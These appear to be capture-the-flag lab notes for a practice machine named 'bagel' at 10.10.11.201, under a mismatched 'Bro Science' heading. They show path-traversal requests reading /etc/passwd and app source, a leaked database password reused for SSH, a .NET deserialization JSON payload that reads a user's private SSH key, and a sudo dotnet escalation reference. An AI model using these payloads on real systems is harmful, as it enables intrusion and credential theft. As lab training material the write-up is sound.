# Bro Science

## IP = 10.10.11.201

### Initial
```

```

### Directory traversal on: `GET /?page=../../../../../../../../etc/passwd HTTP/1.1`
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

### page=../app.py
```py
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)


```

### ?page=../../../../../../../../../proc/1/cmdline
By spamming different PIDs we find: `dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll`

```
[Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
public void DB_connection()
{
    //IL_0008: Unknown result type (might be due to invalid IL or missing references)
    //IL_000e: Expected O, but got Unknown
    string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
    SqlConnection val = new SqlConnection(text);
    string text2 = "INSERT INTO orders (Name,Address,Count,Type) VALUES ('Eliot','Street',4,'Baggel')";
}
```

### Insecure deserialization (.NET core)
https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15

1. The `TypeNameHandling` field is not None, but `Base` is strictly enforce (and we require `object` to exploit)
```cs
public object Deserialize(string json)
        {
            object result;
            try
            {
                result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
                {
                    TypeNameHandling = 4
                });
            }
            catch
            {
                result = "{\"Message\":\"unknown\"}";
            }
            return result;
        }
```
2. We notice that `Base` has `RemoveOrder` as object, so we could taint this instead of the whole `Base` object
3. We can than abuse the already present `File` class to read Phil's `id_rsa`
```json
order = {
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel",
        "ReadFile": "../../../../../../home/phil/id_rsa"
    }
}
```

### user.txt

### password of developer is the same of the DB connection: `developer:k8wdAYYKyhnjg3K`

### sudo -l
```
[developer@bagel shm]$ sudo -l
Matching Defaults entries for developer on bagel:
    .
    .
    .                                                                                                                             
                                                                                                                                                                                                                                           
User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```
https://gtfobins.github.io/gtfobins/dotnet/

### root.txt